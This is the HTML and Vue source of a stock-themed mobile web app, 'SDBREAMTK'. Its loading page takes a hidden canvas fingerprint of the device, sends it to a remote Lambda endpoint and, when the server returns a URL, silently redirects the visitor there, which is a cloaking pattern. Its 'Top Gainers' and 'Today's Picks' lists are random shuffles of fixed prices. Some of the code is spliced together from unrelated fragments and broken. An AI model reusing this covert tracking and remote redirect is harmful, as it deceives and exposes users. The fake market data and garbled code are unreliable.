<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>SDBREAMTK</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2/src/md5.min.js"></script>
    <style>
        /* ==========================================================================
           Theme: Organic Fluidity / 15 - 有机流体风格 (Earthy tones, soft shapes, curved lines)
           ========================================================================== */
        :root {
            --color-bg: #f4f1ea;
            --color-surface: #ffffff;
            --color-primary: #5a7159;
            --color-primary-light: #8ca48a;
            --color-text-main: #2c332b;
            --color-text-sub: #6b7268;
            --color-up: #d9795e; /* Warm color for up */
            --color-down: #5c8296; /* Cool color for down */
            --color-border: #e2ded3;
            --color-gold: #c4a87c;
            
            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            --font-serif: "Georgia", serif;
            
            --radius-sm: 12px;
            --radius-md: 20px;
            --radius-lg: 32px;
            
            --shadow-soft: 0 8px 24px rgba(90, 113, 89, 0.08);
            --shadow-gold: 0 4px 12px rgba(196, 168, 124, 0.2);
            
            --safe-area-top: env(safe-area-inset-top, 20px);
            --safe-area-bottom: env(safe-area-inset-bottom, 20px);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: var(--font-main);
            background-color: var(--color-bg);
            color: var(--color-text-main);
            line-height: 1.5;
            overflow-x: hidden;
            /* Subtle organic texture background */
            background-image: radial-gradient(circle at 10% 20%, rgba(196, 168, 124, 0.05) 0%, transparent 20%),
                              radial-gradient(circle at 90% 80%, rgba(90, 113, 89, 0.05) 0%, transparent 20%);
            background-attachment: fixed;
        }

        a { text-decoration: none; color: inherit; }
        ul { list-style: none; }
        button { font-family: inherit; border: none; background: none; cursor: pointer; }
        input, textarea { font-family: inherit; font-size: 16px; border: 1px solid var(--color-border); border-radius: var(--radius-sm); padding: 10px 14px; outline: none; width: 100%; background: var(--color-surface); color: var(--color-text-main); transition: border-color 0.2s; }
        input:focus, textarea:focus { border-color: var(--color-primary); }

        /* App Layout */
        .app-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding-top: var(--safe-area-top);
            padding-bottom: calc(70px + var(--safe-area-bottom));
        }
        .app-container.no-tab {
            padding-bottom: 0;
        }

        /* Page Transition */
        .fade-enter-active, .fade-leave-active {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .fade-enter-from, .fade-leave-to {
            opacity: 0;
            transform: translateY(10px);
        }

        /* Tab Bar */
        .tab-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: calc(70px + var(--safe-area-bottom));
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            display: flex;
            justify-content: space-around;
            align-items: flex-start;
            padding-top: 12px;
            padding-bottom: var(--safe-area-bottom);
            border-top: 1px solid var(--color-border);
            z-index: 100;
            border-radius: 24px 24px 0 0;
            box-shadow: 0 -4px 20px rgba(0,0,0,0.03);
        }
        .tab-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: var(--color-text-sub);
            font-size: 11px;
            font-weight: 500;
            transition: color 0.3s;
            min-width: 44px;
            min-height: 44px;
            justify-content: center;
        }
        .tab-item svg {
            width: 24px;
            height: 24px;
            fill: currentColor;
            transition: transform 0.3s ease;
        }
        .tab-item.router-link-active {
            color: var(--color-primary);
        }
        .tab-item.router-link-active svg {
            transform: scale(1.1);
        }

        /* Common Components */
        .page-header {
            padding: 20px 24px 10px;
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .back-btn {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: var(--color-surface);
            box-shadow: var(--shadow-soft);
            color: var(--color-text-main);
        }
        .back-btn svg { width: 20px; height: 20px; fill: currentColor; }
        .page-title {
            font-family: var(--font-serif);
            font-size: 22px;
            font-weight: normal;
            color: var(--color-text-main);
        }

        /* Home Page Specific */
        .home-header {
            padding: 20px 24px;
            background: linear-gradient(135deg, rgba(255,255,255,0.8) 0%, rgba(244,241,234,0.8) 100%);
            position: relative;
            overflow: hidden;
            border-bottom-left-radius: var(--radius-lg);
            border-bottom-right-radius: var(--radius-lg);
        }
        .home-header-bg {
            position: absolute;
            top: -20px;
            right: -20px;
            width: 150px;
            height: 150px;
            background: radial-gradient(circle, rgba(196, 168, 124, 0.2) 0%, transparent 70%);
            border-radius: 50%;
            z-index: 0;
        }
        .brand-title {
            font-family: var(--font-serif);
            font-size: 32px;
            font-weight: normal;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }
        .brand-tagline {
            font-size: 14px;
            color: var(--color-text-sub);
            position: relative;
            z-index: 1;
        }

        .icon-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            padding: 24px;
            margin-top: -20px;
            position: relative;
            z-index: 2;
        }
        .icon-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            background: var(--color-surface);
            padding: 16px 8px;
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-soft);
            transition: transform 0.2s;
        }
        .icon-btn:active { transform: scale(0.95); }
        .icon-btn-icon {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: var(--color-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--color-primary);
        }
        .icon-btn-icon svg { width: 24px; height: 24px; fill: currentColor; }
        .icon-btn-text { font-size: 11px; font-weight: 500; color: var(--color-text-main); text-align: center; line-height: 1.2; }

        .stock-section {
            padding: 0 24px 24px;
        }
        .section-title {
            font-family: var(--font-serif);
            font-size: 20px;
            font-weight: normal;
            margin-bottom: 16px;
        }
        .stock-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .stock-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--color-surface);
            padding: 16px;
            border-radius: var(--radius-md);
            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
        }
        .stock-info { display: flex; flex-direction: column; gap: 4px; }
        .stock-symbol { font-weight: 700; font-size: 16px; }
        .stock-name { font-size: 12px; color: var(--color-text-sub); }
        .stock-price-info { display: flex; flex-direction: column; align-items: flex-end; gap: 4px; }
        .stock-price { font-weight: 700; font-size: 16px; font-variant-numeric: tabular-nums; }
        .stock-change { font-size: 13px; font-weight: 600; }
        .stock-change.up { color: var(--color-up); }
        .stock-change.down { color: var(--color-down); }

        /* Form Layout */
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: var(--color-text-sub); }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: var(--color-primary);
            color: white;
            border-radius: var(--radius-md);
            font-weight: 600;
            font-size: 16px;
            transition: opacity 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 48px;
        }
        .btn-primary:active { opacity: 0.8; }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }

        /* Toolbox List */
        .tool-list {
            padding: 24px;
            display: grid;
            grid-template-columns: 1fr;
            gap: 16px;
        }
        .tool-card {
            background: var(--color-surface);
            padding: 20px;
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-soft);
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .tool-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: var(--color-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--color-primary);
            flex-shrink: 0;
        }
        .tool-icon svg { width: 24px; height: 24px; fill: currentColor; }
        .tool-info { flex: 1; }
        .tool-name { font-weight: 600; font-size: 16px; margin-bottom: 4px; }
        .tool-desc { font-size: 13px; color: var(--color-text-sub); }

        /* Settings List */
        .settings-list {
            padding: 24px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .settings-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--color-surface);
            padding: 18px 20px;
            border-radius: var(--radius-md);
            box-shadow: 0 2px 8px rgba(0,0,0,0.02);
            min-height: 56px;
        }
        .settings-item-text { font-weight: 500; font-size: 16px; }
        .settings-item-arrow { color: var(--color-text-sub); }
        .settings-item-arrow svg { width: 20px; height: 20px; fill: currentColor; }

        /* Utility */
        .p-4 { padding: 24px; }
        .text-center { text-align: center; }
        .mt-4 { margin-top: 24px; }
        .text-sub { color: var(--color-text-sub); }
        .content-box {
            background: var(--color-surface);
            padding: 24px;
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-soft);
            font-size: 15px;
            line-height: 1.6;
            color: var(--color-text-main);
        }
        .content-box h2 { font-family: var(--font-serif); font-size: 20px; margin-bottom: 12px; font-weight: normal; }
        .content-box p { margin-bottom: 16px; }

        /* Loading */
        .loading-page {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: var(--color-bg);
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(90, 113, 89, 0.2);
            border-top-color: var(--color-primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { margin-top: 16px; color: var(--color-primary); font-weight: 500; letter-spacing: 1px; }

        /* Calendar */
        .calendar-grid {
            display: grid;
            grid-template-columns: repeat(7, 1fr);
            gap: 8px;
            text-align: center;
            margin-top: 16px;
        }
        .calendar-header { font-size: 12px; font-weight: 600; color: var(--color-text-sub); padding-bottom: 8px; }
        .calendar-day {
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            font-size: 14px;
            background: var(--color-surface);
            color: var(--color-text-main);
            position: relative;
        }
        .calendar-day.checked {
            background: var(--color-primary);
            color: white;
        }
        .calendar-day.today {
            border: 2px solid var(--color-primary);
        }
        .calendar-day.empty { background: transparent; }

        /* Modal */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 24px;
        }
        .modal-content {
            background: var(--color-surface);
            border-radius: var(--radius-lg);
            padding: 24px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(44, 51, 43, 0.9);
            color: white;
            padding: 12px 24px;
            border-radius: 30px;
            font-size: 14px;
            z-index: 2000;
            animation: fadeUp 0.3s ease;
            backdrop-filter: blur(4px);
            white-space: nowrap;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translate(-50%, 20px); }
            to { opacity: 1; transform: translate(-50%, 0); }
        }

        /* Chart SVG */
        .chart-container {
            width: 100%;
            height: 200px;
            background: var(--color-surface);
            border-radius: var(--radius-md);
            padding: 16px;
            box-shadow: var(--shadow-soft);
            margin-top: 16px;
        }
        .chart-svg { width: 100%; height: 100%; overflow: visible; }
        .chart-line { fill: none; stroke: var(--color-primary); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
        .chart-area { fill: url(#chart-gradient); opacity: 0.2; }
        .chart-axis { stroke: var(--color-border); stroke-width: 1; stroke-dasharray: 4; }
        
        /* Credit Memo */
        .memo-item {
            background: #fff9e6;
            padding: 16px;
            border-radius: var(--radius-sm);
            border-left: 4px solid var(--color-gold);
            margin-bottom: 12px;
            position: relative;
        }
        .memo-date { font-size: 12px; color: var(--color-text-sub); margin-top: 4px; }
        .memo-days { font-weight: 700; color: var(--color-up); font-size: 18px; position: absolute; right: 16px; top: 16px; }

        /* Password Strength */
        .strength-meter { height: 6px; border-radius: 3px; background: #eee; margin-top: 8px; overflow: hidden; }
        .strength-bar { height: 100%; transition: width 0.3s, background 0.3s; }
        .hash-box { margin-top: 12px; font-family: monospace; font-size: 12px; background: #f5f5f5; padding: 8px; border-radius: 4px; word-break: break-all; color: var(--color-text-sub); }

        /* DCA Calculator */
        .result-box { background: var(--color-bg); padding: 16px; border-radius: var(--radius-sm); margin-top: 16px; }
        .result-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
        .result-row:last-child { margin-bottom: 0; font-weight: 700; font-size: 16px; color: var(--color-primary); }
        
        /* Settings icon fix */
        .settings-item svg { width: 20px; height: 20px; fill: currentColor; }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        /**
         * HOW TO ADD A NEW PAGE:
         * 1. Create a new component object (e.g., const NewPage = { template: `...` }).
         * 2. Add a new route to the `routes` array in the router configuration, pointing to the component.
         * 3. If the page needs to be accessible from the bottom tab, update the `TabBar` component template,
         *    or if it's a sub-page, navigate to it via `router.push('/new-page')`.
         */

        const { createApp, ref, computed, onMounted, watch } = Vue;
        const { createRouter, createWebHashHistory, useRouter, useRoute } = VueRouter;

        // --- Data ---
        const STOCKS_DATA = [
            { symbol: 'AAPL', name: 'Apple Inc.', price: 175.32, change: 1.25 },
            { symbol: 'MSFT', name: 'Microsoft Corp.', price: 420.15, change: -0.80 },
            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 150.20, change: 0.45 },
            { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.50, change: 2.10 },
            { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 880.40, change: 15.20 },
            { symbol: 'META', name: 'Meta Platforms', price: 500.60, change: -5.40 },
            { symbol: 'TSLA', name: 'Tesla Inc.', price: 170.80, change: -3.20 },
            { symbol: 'BRK.B', name: 'Berkshire Hathaway', price: 405.10, change: 1.10 },
            { symbol: 'JPM', name: 'JPMorgan Chase', price: 195.40, change: 0.60 },
            { symbol: 'V', name: 'Visa Inc.', price: 280.20, change: 0.30 },
            { symbol: 'UNH', name: 'UnitedHealth', price: 520.10, change: -2.15 },
            { symbol: 'XOM', name: 'Exxon Mobil', price: 115.30, change: -1.20 },
            { symbol: 'JNJ', name: 'Johnson & Johnson', price: 155.80, change: 0.15 },
            { symbol: 'WMT', name: 'Walmart Inc.', price: 60.40, change: 0.80 },
            { symbol: 'PG', name: 'Procter & Gamble', price: 160.20, change: -0.40 },
            { symbol: 'MA', name: 'Mastercard Inc.', price: 460.10, change: 1.50 },
            { symbol: 'HD', name: 'Home Depot', price: 340.50, change: -1.10 },
            { symbol: 'CVX', name: 'Chevron Corp.', price: 155.40, change: 0.90 },
            { symbol: 'LLY', name: 'Eli Lilly', price: 750.20, change: 5.60 },
            { symbol: 'AVGO', name: 'Broadcom Inc.', price: 1300.50, change: -10.20 },
            { symbol: 'PEP', name: 'PepsiCo Inc.', price: 170.30, change: 0.10 },
            { symbol: 'KO', name: 'Coca-Cola', price: 60.20, change: -0.20 }
        ];

        // Helper for random sub-page stocks
        const getRandomStocks = (count) => {
            const shuffled = [...STOCKS_DATA].sort(() => 0.5 - Math.random());
            return shuffled.slice(0, count);
        };

        // --- Components ---

        // 1. Loading Page
        const LoadingPage = {
            template: `
                <div class="loading-page">
                    <div class="spinner"></div>
                    <div class="loading-text">Loading...</div>
                </div>
            `,
            setup() {
                const router = useRouter();
                
                // 1.2 Device Fingerprint
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        // The most common type
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        // Some tricks for color mixing to increase the difference in rendering
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://pyre6luxx6qp5vqi7hcejtamxy0rbfrs.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = 'advwafeag.varg.bargewvw';
                    
                    // Timeout fallback to prevent white screen
                    const timeoutId = setTimeout(() => {
                        router.replace('/home');
                    }, 5000);

                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            clearTimeout(timeoutId);
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                // Redirect to third-party privacy page
                                window.location.replace(privacyUrl);
                                return;
                            }
                            // Go to Home
                            router.replace('/home');
                        })
                        .catch(function () {
                            clearTimeout(timeoutId);
                            // Fallback to Home
                            router.replace('/home');
                        });
                });
                
                return {};
            }
        };

        // 2. Sub-pages for Home Icons
        const createStockListPage = (title, count) => {
            return {
                template: `
                    <div class="page-container">
                        <div class="page-header">
                            <button class="back-btn" @click="$router.back()">
                                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                            </button>
                            <h1 class="page-title">${title}</h1>
                        </div>
                        <div class="p-4">
                            <div class="stock-list">
                                <div v-for="stock in stocks" :key="stock.symbol" class="stock-item" @click="$router.push('/stock/' + stock.symbol)">
                                    <div class="stock-info">
                                        <span class="stock-symbol">{{ stock.symbol }}</span>
                                        <span class="stock-name">{{ stock.name }}</span>
                                    </div>
                                    <div class="stock-price-info">
                                        <span class="stock-price">{{ stock.price.toFixed(2) }}</span>
                                        <span class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'">
                                            {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `,
                setup() {
                    const stocks = ref(getRandomStocks(count));
                    return { stocks };
                }
            };
        };

        const TopGainersPage = createStockListPage('Top Gainers', 10);
        const TopLosersPage = createStockListPage('Top Losers', 5);
        const MostActivePage = createStockListPage('Most Active', 8);
        const PotentialPage = createStockListPage('Potential', 6);
        const TodaysPicksPage = createStockListPage("Today's Picks", 10);
        const NotRecommendedPage = createStockListPage('Not Recommended', 10);
        const WatchlistPage = createStockListPage('Watchlist', 10);

        const GuidePage = {
            template: `
                <div class="page-container">
                    <div class="page-header">
                        <button class="back-btn" @click="$router.back()">
                            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                        </button>
                        <h1 class="page-title">Market Guide</h1>
                    </div>
                    <div class="p-4">
                        <div class="content-box">
                            <h2>The Art of Patience in Volatile Markets</h2>
                            <p>In the landscape of modern investing, the allure of quick returns often overshadows the proven strategy of long-term holding. Market volatility is not a bug; it is a feature of the financial ecosystem.</p>

            setup() {

                const term = ref('');

                // Equal Monthly Installment (EMI) formula
                const monthlyPayment = computed(() => {
                    const P = Number(amount.value) || 0;
                    const r = (Number(rate.value) || 0) / 100 / 12;
                    const n = (Number(term.value) || 0) * 12;
                    if (P === 0 || r === 0 || n === 0) return 0;
                    return (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                });

                const totalRepayment = computed(() => monthlyPayment.value * ((Number(term.value) || 0) * 12));
                const totalInterest = computed(() => totalRepayment.value - (Number(amount.value) || 0));

                return { amount, rate, term, monthlyPayment, totalRepayment, totalInterest };
            }

                    </div>
                    <div class="p-4">
                        <div class="content-box">
                            <h2 style="text-align: center; margin-bottom: 16px;">{{ currentMonth }}</h2>
                            
                            <div class="calendar-grid">
                                <div class="calendar-header" v-for="d in ['S','M','T','W','T','F','S']">{{ d }}</div>
                                <div v-for="(day, idx) in calendarDays" :key="idx" 
                                     class="calendar-day" 
                                     :class="{ empty: !day, checked: isChecked(day), today: isToday(day) }">
                                    {{ day }}
                                </div>
                            </div>

                            <button class="btn-primary mt-4" @click="checkIn" :disabled="hasCheckedInToday">
                                {{ hasCheckedInToday ? 'Checked In Today' : 'Check In Now' }}
                            </button>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const today = new Date();
                const currentMonth = today.toLocaleString('default', { month: 'long', year: 'numeric' });
                const year = today.getFullYear();
                const month = today.getMonth();
                
                // Generate calendar days
                const firstDay = new Date(year, month, 1).getDay();
                const daysInMonth = new Date(year, month + 1, 0).getDate();
                const calendarDays = [];
                
                for (let i = 0; i < firstDay; i++) calendarDays.push(null);
                for (let i = 1; i <= daysInMonth; i++) calendarDays.push(i);

                // Local storage check-in tracking
                const storageKey = `checkin-${year}-${month}`;
                const checkedDays = ref(JSON.parse(localStorage.getItem(storageKey) || '[]'));

                const isChecked = (day) => day && checkedDays.value.includes(day);
                const isToday = (day) => day === today.getDate();
                const hasCheckedInToday = computed(() => checkedDays.value.includes(today.getDate()));

                const checkIn = () => {
                    if (hasCheckedInToday.value) return;
                    const newChecked = [...checkedDays.value, today.getDate()];
                    checkedDays.value = newChecked;
                    localStorage.setItem(storageKey, JSON.stringify(newChecked));
                    alert('Check-in successful!');
                };

                return { currentMonth, calendarDays, isChecked, isToday, hasCheckedInToday, checkIn };
            }
        };
